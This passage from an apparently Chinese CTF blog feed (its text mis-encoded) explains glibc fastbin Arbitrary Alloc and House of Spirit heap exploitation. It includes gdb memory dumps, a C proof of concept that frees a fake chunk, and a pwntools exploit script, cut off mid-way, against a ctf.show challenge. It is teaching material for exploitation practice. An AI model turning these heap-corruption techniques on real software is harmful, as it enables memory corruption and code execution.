<span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b00</span> <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x2e <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b08</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x2a <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;: <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>x28    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>xff    <span class="hljs-number">0</span>x7f    <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>0x7ffff7dd1b10 æ˜¯æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„ __malloc_hook çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬å‘ä¸Šå¯»æ‰¾æ˜¯å¦å¯ä»¥é”™ä½å‡ºä¸€ä¸ªåˆæ³•çš„ size åŸŸã€‚å› ä¸ºè¿™ä¸ªç¨‹åºæ˜¯ 64 ä½çš„ï¼Œå› æ­¤ fastbin çš„èŒƒå›´ä¸º 32 å­—èŠ‚åˆ° 128 å­—èŠ‚ (0x20-0x80)ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//è¿™é‡Œçš„sizeæŒ‡ç”¨æˆ·åŒºåŸŸï¼Œå› æ­¤è¦å°2å€SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿå‘ç° 0x7ffff7dd1af5 å¤„å¯ä»¥ç°å®é”™ä½æ„é€ å‡ºä¸€ä¸ª 0x000000000000007f</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><br><span class="hljs-attribute">0x7ffff7dd1af5</span> &lt;_IO_wide_data_0+<span class="hljs-number">309</span>&gt;:   <span class="hljs-number">0</span>x000000000000007f<br></code></pre></td></tr></table></figure><p>å› ä¸º 0x7f åœ¨è®¡ç®— fastbin index æ—¶(64ä½)ï¼Œæ˜¯å±äº index 5 çš„ï¼Œå³ chunk å¤§å°ä¸º 0x70 çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">#<span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz)                                                      </span><br>    ((((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>ï¼ˆæ³¨æ„ sz çš„å¤§å°æ˜¯ unsigned intï¼Œå› æ­¤åªå  4 ä¸ªå­—èŠ‚ï¼‰</p><p>è€Œå…¶å¤§å°åˆåŒ…å«äº† 0x10 çš„ chunk_headerï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©åˆ†é… 0x60 çš„ fastbinï¼Œå°†å…¶åŠ å…¥é“¾è¡¨ã€‚ æœ€åç»è¿‡ä¸¤æ¬¡åˆ†é…å¯ä»¥è§‚å¯Ÿåˆ° chunk è¢«åˆ†é…åˆ° 0x7ffff7dd1afdï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ§åˆ¶ __malloc_hook çš„å†…å®¹ (åœ¨æˆ‘çš„ libc ä¸­__realloc_hook ä¸__malloc_hook æ˜¯åœ¨è¿åœ¨ä¸€èµ·çš„)ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x4005a8</span> &lt;main+<span class="hljs-number">66</span>&gt;        <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400450</span> &lt;malloc@plt&gt;<br> â†’   <span class="hljs-number">0x4005ad</span> &lt;main+<span class="hljs-number">71</span>&gt;        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rax</span><br><br> $<span class="hljs-built_in">rax</span>   : <span class="hljs-number">0x7ffff7dd1afd</span><br><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:   <span class="hljs-number">0xfff7dd0260000000</span>  <span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>: <span class="hljs-number">0xfff7a92e20000000</span>  <span class="hljs-number">0xfff7a92a0000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:  <span class="hljs-number">0x000000000000007f</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>: <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h3 id="å°æ€»ç»“-1"><a href="#å°æ€»ç»“-1" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>Arbitrary Alloc åœ¨ CTF ä¸­ç”¨åœ°æ›´åŠ é¢‘ç¹ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å­—èŠ‚é”™ä½ç­‰æ–¹æ³•æ¥ç»•è¿‡ size åŸŸçš„æ£€éªŒï¼Œå®ç°ä»»æ„åœ°å€åˆ†é… chunkï¼Œæœ€åçš„æ•ˆæœä¹Ÿå°±ç›¸å½“äºä»»æ„åœ°å€å†™ä»»æ„å€¼ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastbin Attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spiritæ”»å‡»</title>
    <link href="/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>House of Spiritæ˜¯ä¸€ç§å †åˆ©ç”¨æ–¹æ³•ï¼Œå…¶æ ¸å¿ƒåœ¨äºé€šè¿‡ä»»æ„åœ°å€çš„é‡Šæ”¾è¾¾åˆ°ç¯¡æ”¹åœ°å€çš„ç›®çš„ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>åœ¨ç›®æ ‡åœ°å€å‘¨å›´èƒ½å¤Ÿä¼ªé€ ä¸€ä¸ªå †å—ã€‚</li><li>èƒ½å¯¹ä¼ªé€ å †å—åœ°å€å‘¨å›´è¿›è¡Œä¸€æ¬¡é‡Šæ”¾ï¼ˆå³å°†ä¼ªé€ çš„å †å—åœ°å€ä½œä¸ºfreeå‡½æ•°çš„å‚æ•°è¿›è¡Œä¸€æ¬¡é‡Šæ”¾æ“ä½œï¼‰</li><li>é‡Šæ”¾ä¹‹åèƒ½å¤Ÿé‡æ–°ç”³è¯·å¾—åˆ°è¿™ä¸ªå †å—å¹¶ç¯¡æ”¹ç›®æ ‡åœ°å€çš„å†…å®¹</li></ol><p>è¿™é‡Œç»™å‡ºä¸€ä¸ªPOCä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> data[<span class="hljs-number">0x20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> size = <span class="hljs-number">0x70</span>;<br><span class="hljs-type">void</span> *p;<br>init();<br><span class="hljs-comment">// init arena</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// fake chunk header</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,data);<br>data[<span class="hljs-number">0</span>] = <span class="hljs-number">0x0</span>;<br>data[<span class="hljs-number">1</span>] = size | <span class="hljs-number">1</span>; <span class="hljs-comment">// prev_inuse_bit</span><br><span class="hljs-comment">// fake next chunk header</span><br>data[size / <span class="hljs-number">8</span>] = <span class="hljs-number">0x0</span>;<br>data[(size / <span class="hljs-number">8</span>) + <span class="hljs-number">1</span>] = <span class="hljs-number">0x11</span>;<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// free user data place, fd.</span><br><span class="hljs-built_in">free</span>(&amp;data[<span class="hljs-number">2</span>]);<br>sleep(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// user&#x27;s size == chunk_size - 0x10</span><br>p = <span class="hljs-built_in">malloc</span>(size - <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,p);<br>sleep(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>gccç¼–è¯‘ä¸€ä¸‹è¿›è¡Œè°ƒè¯•åˆ†æ</p><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022055703.png" alt="è¿è¡Œç»“æœ"></p><p>è°ƒè¯•å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb House_of_Spirit<br>b <span class="hljs-built_in">sleep</span><br>r<br>x /20gz 0x6010a0<br></code></pre></td></tr></table></figure><p>xæŒ‡ä»¤ç»“æœä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022100510.png" alt="xæŒ‡ä»¤ç»“æœ"></p><p>binsæŒ‡ä»¤ç»“æœä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022149700.png" alt="binsæŒ‡ä»¤ç»“æœ"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ªé€ chunkæˆåŠŸï¼Œprev_sizeä¸º0ï¼Œsizeå­—æ®µä¸º0x71ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„å¤´éƒ¨ï¼Œå¦‚æœä¸ä¼ªé€ ï¼Œå°±ä¼šæŠ¥é”™ã€‚å› ä¸ºä¼šæ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„sizeå­—æ®µï¼Œå¦‚æœä¸‹ä¸€ä¸ªchunkçš„å­—æ®µä¸åœ¨æ­£å¸¸èŒƒå›´å†…ï¼ˆ2*SIZE_SZåˆ°av-&gt;system_memï¼‰ï¼Œåˆ™ä¼šæŠ¥é”™é€€å‡ºï¼Œæ‰€ä»¥åœ¨ä¼ªé€ chunkçš„æ—¶å€™ï¼Œä¸ä»…è¦ä¼ªé€ å½“å‰çš„chunkå¤´ï¼Œè¿˜è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„å¤´éƒ¨</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜ä¸‹è½½ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn144_1604">ä¾‹é¢˜</a></p><p>æŸ¥çœ‹ä¿æŠ¤</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022122900.png" alt="æŸ¥çœ‹ä¿æŠ¤"></p><p>IDAåç¼–è¯‘å‘ç°åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022130508.png" alt="åé—¨å‡½æ•°"></p><p>åœ¨mainå‡½æ•°ä¸­æ»¡è¶³ä¸€å®šæ¡ä»¶å¯ä»¥è°ƒç”¨åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022129971.png" alt="mainå‡½æ•°"></p><p>magic ä¸ºåœ¨ bss æ®µçš„å…¨å±€å˜é‡ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ v3 ä¸º 114514 å¹¶ä¸”è¦†å†™ magic ä½¿å…¶å€¼â¼¤äº 114514 ï¼Œå°±èƒ½get flagã€‚</p><p>çœ‹èœå•menu()</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022131344.png" alt="èœå•"></p><p>æ‰“å¼€create_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133356.png" alt="create_heap"></p><p>heaparray æ•°ç»„ï¼šå­˜æ”¾ chunk çš„â¾¸åœ°å€ã€‚</p><p>read_input(heaparray[i], size)ï¼šæŠŠæˆ‘ä»¬è¾“â¼Šçš„å†…å®¹å†™â¼Š chunk ä¸­ã€‚</p><p>ä¸”heaparrayæ˜¯å­˜æ”¾åœ¨bssæ®µä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022133318.png" alt="bssæ®µ"></p><p>æ‰“å¼€edit_heap():</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022134629.png" alt="edit_heap"></p><p>å¯ä»¥å†æ¬¡ç¼–è¾‘ chunk çš„å†…å®¹ï¼Œâ½½ä¸”å¯ä»¥é€‰æ‹©è¾“â¼Šâ¼¤â¼©ã€‚å¦‚æœæˆ‘ä»¬è¿™æ¬¡è¾“â¼Šçš„ size â½åˆ›å»ºæ—¶â¼¤çš„è¯ï¼Œå°±ä¼šå¯¼è‡´å †æº¢å‡º</p><p>ï¼ˆread_input(heaparray[v1], v2)ï¼šå‘ chunk ä¸­å†™â¼Š v2 â¼¤â¼©çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ v2 â½ create æ—¶çš„ size â¼¤çš„è¯å°±ä¼šé€ æˆå †æº¢å‡ºã€‚ï¼‰</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨House of Spirit</p><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>é¦–å…ˆåˆ›å»ºä¿©ä¸ªchunkï¼Œchunk0å¤§å°ä¸º0x10ï¼Œchunk1çš„å¤§å°ä¸º0x60</li><li>ç„¶ååˆ é™¤chunk1</li><li>ç¼–è¾‘chunk0é€ æˆå †æº¢å‡ºï¼Œä¿®æ”¹chunk1çš„fdæŒ‡é’ˆä¸º0x000000000060208d</li><li>åˆ›å»ºä¸¤ä¸ªchunkå¤§å°éƒ½ä¸º0x60ï¼Œç¬¬ä¸€ä¸ªå†…å®¹éšæ„ï¼Œç¬¬äºŒä¸ªè¦æ„é€ payloadè¦†ç›–magicçš„å€¼</li><li>getflag</li></ol><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨æˆ‘ä»¬ä¿®æ”¹fdæŒ‡é’ˆæ—¶ï¼Œéœ€è¦è¿åˆ°ä¸€ä¸ªåˆæ³•çš„chunkå¤´ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144519.png" alt="å†…å­˜åˆ†å¸ƒ"></p><p>è¿™å°±æ˜¯ä¸€ä¸ªåˆæ³•çš„chunkå¤´ï¼Œå¤§å°ä¸º0x70</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408022144814.png" alt="å†…å­˜åˆ†å¸ƒ"></p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn144_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28271&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * main</span><br><span class="hljs-string">            b * 0x0000000000400B1A</span><br><span class="hljs-string">            b * 0x0000000000400C4A</span><br><span class="hljs-string">            b * 0x0000000000400D43</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span> , <span 